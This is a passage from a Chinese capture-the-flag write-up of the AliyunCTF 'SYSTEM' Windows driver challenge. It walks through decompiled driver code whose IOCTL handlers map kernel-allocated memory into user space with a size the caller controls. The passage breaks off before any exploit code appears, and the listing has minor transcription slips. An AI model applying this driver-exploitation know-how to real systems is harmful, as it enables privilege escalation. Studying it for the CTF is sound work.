<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>AliyunCTF SYSTEM - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
Windows Driver Exploit
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="AliyunCTF SYSTEM" />
<meta property="og:description" content="
Windows Driver Exploit
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/aliyunctf-system/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-04-25T12:00:00+00:00" />
<meta property="article:modified_time" content="2024-04-25T12:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="AliyunCTF SYSTEM"/>
<meta name="twitter:description" content="
Windows Driver Exploit
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">AliyunCTF SYSTEM</h1>
			<div class="meta">Posted on Apr 25, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>Windows Driver Exploit</p>
</blockquote>
<p>知识点蛮多的</p>
<h2 id="driver">Driver</h2>
<p>是个驱动，内容比较少，稍微看一下逻辑</p>
<p>驱动入口：DriverEntry，第一个函数是Windows给程序加了 <code>_security_cookie</code>，然后初始化DriverObject</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#ff79c6">__stdcall</span> <span style="color:#50fa7b">DriverEntry</span>(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  sub_14000610C();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> Init(DriverObject);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>初始化DriverObject。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">Init</span>(PDRIVER_OBJECT DriverObject)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  NTSTATUS result; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  NTSTATUS v3; <span style="color:#6272a4">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  _OWORD <span style="color:#ff79c6">*</span>DeviceExtension; <span style="color:#6272a4">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_UNICODE_STRING</span> DeviceName; <span style="color:#6272a4">// [rsp+40h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_UNICODE_STRING</span> DestinationString; <span style="color:#6272a4">// [rsp+50h] [rbp-18h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PDEVICE_OBJECT DeviceObject; <span style="color:#6272a4">// [rsp+80h] [rbp+18h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  DeviceObject <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>  RtlInitUnicodeString(<span style="color:#ff79c6">&amp;</span>DeviceName, <span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Device</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">SIOCTL&#34;</span>);
</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> IoCreateDevice(DriverObject, <span style="color:#bd93f9">0x30u</span>, <span style="color:#ff79c6">&amp;</span>DeviceName, <span style="color:#bd93f9">0x22u</span>, <span style="color:#bd93f9">0x100u</span>, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">&amp;</span>DeviceObject);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( result <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    DriverObject<span style="color:#ff79c6">-&gt;</span>MajorFunction[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> (PDRIVER_DISPATCH)DispatchCommon;
</span></span><span style="display:flex;"><span>    DriverObject<span style="color:#ff79c6">-&gt;</span>MajorFunction[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> (PDRIVER_DISPATCH)DispatchCommon;
</span></span><span style="display:flex;"><span>    DriverObject<span style="color:#ff79c6">-&gt;</span>MajorFunction[<span style="color:#bd93f9">14</span>] <span style="color:#ff79c6">=</span> (PDRIVER_DISPATCH)DispatchControl;
</span></span><span style="display:flex;"><span>    DriverObject<span style="color:#ff79c6">-&gt;</span>DriverUnload <span style="color:#ff79c6">=</span> (PDRIVER_UNLOAD)Unload;
</span></span><span style="display:flex;"><span>    RtlInitUnicodeString(<span style="color:#ff79c6">&amp;</span>DestinationString, <span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">DosDevices</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">IoctlTest&#34;</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#ff79c6">=</span> IoCreateSymbolicLink(<span style="color:#ff79c6">&amp;</span>DestinationString, <span style="color:#ff79c6">&amp;</span>DeviceName);
</span></span><span style="display:flex;"><span>    DeviceExtension <span style="color:#ff79c6">=</span> DeviceObject<span style="color:#ff79c6">-&gt;</span>DeviceExtension;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>DeviceExtension <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>    DeviceExtension[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>    DeviceExtension[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v3 <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>      IoDeleteDevice(DeviceObject);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> v3;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    _mm_lfence();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>DispatchCommon</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define IRP_MJ_CREATE                     0x00 
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define IRP_MJ_CLOSE                      0x02 
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">DispatchCommon</span>(<span style="color:#ff79c6">__int64</span> a1, IRP <span style="color:#ff79c6">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  a2<span style="color:#ff79c6">-&gt;</span>IoStatus.Status <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  a2<span style="color:#ff79c6">-&gt;</span>IoStatus.Information <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>  IofCompleteRequest(a2, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>我们可以控制的是size的大小，并且这个size大小为0x1000的倍数，向上取整</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define IRP_MJ_DEVICE_CONTROL           0x0e
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">DispatchControl</span>(PDEVICE_OBJECT pDeviceObject, IRP <span style="color:#ff79c6">*</span>irp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IO_STACK_LOCATION</span> <span style="color:#ff79c6">*</span>CurrentStackLocation; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v3; <span style="color:#6272a4">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PVOID DeviceExtension; <span style="color:#6272a4">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  ULONG ulInputBufferLength; <span style="color:#6272a4">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  ULONG ulOutputBufferLength; <span style="color:#6272a4">// edx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  ULONG ulIoControlCode; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>__pStartAddr2; <span style="color:#6272a4">// rcx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> <span style="color:#ff79c6">*</span>__pMdl2; <span style="color:#6272a4">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>__pVirtualAddress; <span style="color:#6272a4">// rcx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> <span style="color:#ff79c6">*</span>__pMdl; <span style="color:#6272a4">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buffer; <span style="color:#6272a4">// r13
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> _usSize; <span style="color:#6272a4">// r15d
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PVOID ContiguousMemory; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>_pVirtualAddress; <span style="color:#6272a4">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> <span style="color:#ff79c6">*</span>Mdl; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> <span style="color:#ff79c6">*</span>_pMdl; <span style="color:#6272a4">// r14
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PVOID pStartAddr2; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PVOID _pStartAddr2; <span style="color:#6272a4">// r12
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  _DWORD <span style="color:#ff79c6">*</span>SystemBuffer; <span style="color:#6272a4">// r13
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> usSize; <span style="color:#6272a4">// r15d
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PVOID pVirtualAddress; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> <span style="color:#ff79c6">*</span>pMdl; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> pMapAddr; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> _pMapAddr; <span style="color:#6272a4">// r12d
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  CurrentStackLocation <span style="color:#ff79c6">=</span> irp<span style="color:#ff79c6">-&gt;</span>Tail.Overlay.CurrentStackLocation;
</span></span><span style="display:flex;"><span>  v3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  DeviceExtension <span style="color:#ff79c6">=</span> pDeviceObject<span style="color:#ff79c6">-&gt;</span>DeviceExtension;
</span></span><span style="display:flex;"><span>  ulInputBufferLength <span style="color:#ff79c6">=</span> CurrentStackLocation<span style="color:#ff79c6">-&gt;</span>Parameters.DeviceIoControl.InputBufferLength;
</span></span><span style="display:flex;"><span>  ulOutputBufferLength <span style="color:#ff79c6">=</span> CurrentStackLocation<span style="color:#ff79c6">-&gt;</span>Parameters.DeviceIoControl.OutputBufferLength;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>ulInputBufferLength <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>ulOutputBufferLength )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xC000000D</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ulIoControlCode <span style="color:#ff79c6">=</span> CurrentStackLocation<span style="color:#ff79c6">-&gt;</span>Parameters.DeviceIoControl.IoControlCode;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">switch</span> ( ulIoControlCode )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x9C402400</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( ulInputBufferLength <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">4</span> <span style="color:#ff79c6">||</span> ulOutputBufferLength <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">8</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>      SystemBuffer <span style="color:#ff79c6">=</span> irp<span style="color:#ff79c6">-&gt;</span>AssociatedIrp.SystemBuffer;
</span></span><span style="display:flex;"><span>      usSize <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">*</span>SystemBuffer <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xFFF</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFFFF000</span>;
</span></span><span style="display:flex;"><span>      pVirtualAddress <span style="color:#ff79c6">=</span> MmAllocateContiguousMemory(usSize, (PHYSICAL_ADDRESS)<span style="color:#bd93f9">0xFFFFFFFFFFFFFFFFu</span>i64);
</span></span><span style="display:flex;"><span>      _pVirtualAddress <span style="color:#ff79c6">=</span> pVirtualAddress;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( pVirtualAddress )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        pMdl <span style="color:#ff79c6">=</span> IoAllocateMdl(pVirtualAddress, usSize, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>i64);<span style="color:#ff79c6">/</span>
</span></span><span style="display:flex;"><span>        _pMdl <span style="color:#ff79c6">=</span> pMdl;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( pMdl )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          MmBuildMdlForNonPagedPool(pMdl); 
</span></span><span style="display:flex;"><span>          pMapAddr <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)MmMapLockedPagesSpecifyCache(_pMdl, <span style="color:#bd93f9">1</span>, MmNonCached, <span style="color:#bd93f9">0</span>i64, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x10u</span>);
</span></span><span style="display:flex;"><span>          _pMapAddr <span style="color:#ff79c6">=</span> pMapAddr;
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> ( pMapAddr )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">=</span> pMapAddr;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">=</span> _pVirtualAddress;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>) <span style="color:#ff79c6">=</span> _pMdl;
</span></span><span style="display:flex;"><span>            Memset(<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)pMapAddr, <span style="color:#bd93f9">0xFF</span>, usSize);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>SystemBuffer <span style="color:#ff79c6">=</span> usSize;             
</span></span><span style="display:flex;"><span>            SystemBuffer[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> _pMapAddr;        
</span></span><span style="display:flex;"><span>            irp<span style="color:#ff79c6">-&gt;</span>IoStatus.Information <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>i64;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_31</span>:
</span></span><span style="display:flex;"><span>          IoFreeMdl(_pMdl);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_29</span>:
</span></span><span style="display:flex;"><span>        MmFreeContiguousMemory(_pVirtualAddress);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xC000009A</span>i64;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x9C402404</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( ulInputBufferLength <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">4</span> <span style="color:#ff79c6">||</span> ulOutputBufferLength <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">12</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>      buffer <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)irp<span style="color:#ff79c6">-&gt;</span>AssociatedIrp.SystemBuffer;
</span></span><span style="display:flex;"><span>      _usSize <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)buffer <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xFFF</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFFFF000</span>;
</span></span><span style="display:flex;"><span>      ContiguousMemory <span style="color:#ff79c6">=</span> MmAllocateContiguousMemory(_usSize, (PHYSICAL_ADDRESS)<span style="color:#bd93f9">0xFFFFFFFFFFFFFFFFu</span>i64);
</span></span><span style="display:flex;"><span>      _pVirtualAddress <span style="color:#ff79c6">=</span> ContiguousMemory;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( ContiguousMemory )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        Mdl <span style="color:#ff79c6">=</span> IoAllocateMdl(ContiguousMemory, _usSize, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>i64);
</span></span><span style="display:flex;"><span>        _pMdl <span style="color:#ff79c6">=</span> Mdl;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( Mdl )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          MmBuildMdlForNonPagedPool(Mdl);
</span></span><span style="display:flex;"><span>          pStartAddr2 <span style="color:#ff79c6">=</span> MmMapLockedPagesSpecifyCache(_pMdl, <span style="color:#bd93f9">1</span>, MmNonCached, <span style="color:#bd93f9">0</span>i64, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x10u</span>);
</span></span><span style="display:flex;"><span>          _pStartAddr2 <span style="color:#ff79c6">=</span> pStartAddr2;
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> ( pStartAddr2 )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">=</span> _pVirtualAddress;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">=</span> pStartAddr2;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span>) <span style="color:#ff79c6">=</span> _pMdl;
</span></span><span style="display:flex;"><span>            Memset(pStartAddr2, <span style="color:#bd93f9">0xFF</span>, _usSize);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)buffer <span style="color:#ff79c6">=</span> _usSize;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(buffer <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">=</span> _pStartAddr2;
</span></span><span style="display:flex;"><span>            irp<span style="color:#ff79c6">-&gt;</span>IoStatus.Information <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">12</span>i64;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LABEL_31;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> LABEL_29;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xC000009A</span>i64;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x9C402408</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!*</span>(_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> LABEL_17;
</span></span><span style="display:flex;"><span>      __pMdl <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>__pMdl <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> LABEL_17;
</span></span><span style="display:flex;"><span>      MmUnmapLockedPages(<span style="color:#ff79c6">*</span>(PVOID <span style="color:#ff79c6">*</span>)DeviceExtension, __pMdl);
</span></span><span style="display:flex;"><span>      IoFreeMdl(<span style="color:#ff79c6">*</span>((PMDL <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>));
</span></span><span style="display:flex;"><span>      __pVirtualAddress <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">goto</span> LABEL_16;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x9C40240C</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>      __pStartAddr2 <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>__pStartAddr2 )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> LABEL_17;
</span></span><span style="display:flex;"><span>      __pMdl2 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>__pMdl2 <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) )
